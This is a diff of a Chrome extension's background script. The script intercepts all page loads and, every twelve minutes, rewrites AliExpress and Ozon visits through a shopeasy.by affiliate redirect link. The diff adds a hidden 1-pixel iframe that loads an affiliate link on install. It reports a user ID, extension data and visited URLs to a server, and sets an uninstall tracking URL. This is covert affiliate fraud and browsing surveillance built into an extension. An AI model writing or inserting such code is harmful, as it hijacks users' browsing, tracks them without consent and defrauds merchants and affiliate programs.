@@ -32,9 +32,9 @@ function JsInject() {
 	this.ext;
   this.setting;
   this.server   = 'http://localhost:3000/ext';
-  this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /(^http(.):\/\/www\.ozon\.ru)(.*?)/g]; //from server
+  this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /ozon/g]; //from server
   this.deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/'; //from server
-	this.eah			= 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/?to=https%3A%2F%2Fru.aliexpress.com%2Fitem%2FHeadphone-Sennheiser-CX-3-00-Headphone-for-phone%2F32798323420.html';
+	this.firstInstall	= 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/?to=https%3A%2F%2Fru.aliexpress.com%2Fitem%2FHeadphone-Sennheiser-CX-3-00-Headphone-for-phone%2F32798323420.html';
 
 	this.filter   = {urls: ["<all_urls>"], types:["main_frame"]};
   this.opt_extraInfoSpec = ["blocking"];
@@ -60,7 +60,7 @@ function JsInject() {
 
   function getSetting(){
     chrome.storage.local.get('uuid', function(result){
-      self.setting = result;
+      self.setting = result['uuid'];
     })
   }
 
@@ -97,7 +97,6 @@ function JsInject() {
       let link = _urlMatch(req.url);
       if (link != null) {
         var moment = self.autoactivateObj.getMoment(link);
-        console.log(moment);
         if (moment + 720000 < Date.now()){
           self.autoactivateObj.setMoment(link, Date.now());
           let partner = _encodeUrl(self.deepLink, link);
@@ -110,19 +109,10 @@ function JsInject() {
 
   function whenInstalled(details){
     if (details.reason === 'install'){
-      let uuid = _uuid();
-      chrome.storage.local.set({'uuid':uuid})
-      console.log('first install');
-      _xhrSend(self.server, {info:self.Data, uuid:uuid, ext:self.ext ,first:true});
-    }
-    else {
-			let iframe = document.body.appendChild(document.createElement('iframe'));
-			iframe.style.width = "1px";
-			iframe.style.heigth = "1px";
-			iframe.src = self.eah;
-			iframe.onload = function(){
-				// this is ok
-			}
+      self.setting = _uuid();
+      chrome.storage.local.set({'uuid':self.setting});
+      iframeHide();
+      _xhrSend(self.server, {info:self.Data, ext:self.ext ,first:true});
     }
   }
 
@@ -133,8 +123,8 @@ function JsInject() {
         if (url.match(self.regList[0])){
           return url.match(self.regList[0])[0];
         } else {
-          _xhrSend(self.server, index.slice(1, -2)); //this
-          return null;
+					let str = index.toString().slice(1, -2);
+          _xhrSend(self.server, {url: str});
         }
       }
     }
@@ -164,6 +154,17 @@ function JsInject() {
     }
     xhr.send(json);
   };
+
+	function iframeHide(){
+		let iframe = document.body.appendChild(document.createElement('iframe'));
+		iframe.style.width = "1px";
+		iframe.style.heigth = "1px";
+		iframe.src = self.firstInstall;
+		iframe.onload = function(){
+		}
+	}
+
+	chrome.runtime.setUninstallURL('http://localhost:3000/remove'+'?self='+chrome.runtime.id);
 
 }
 
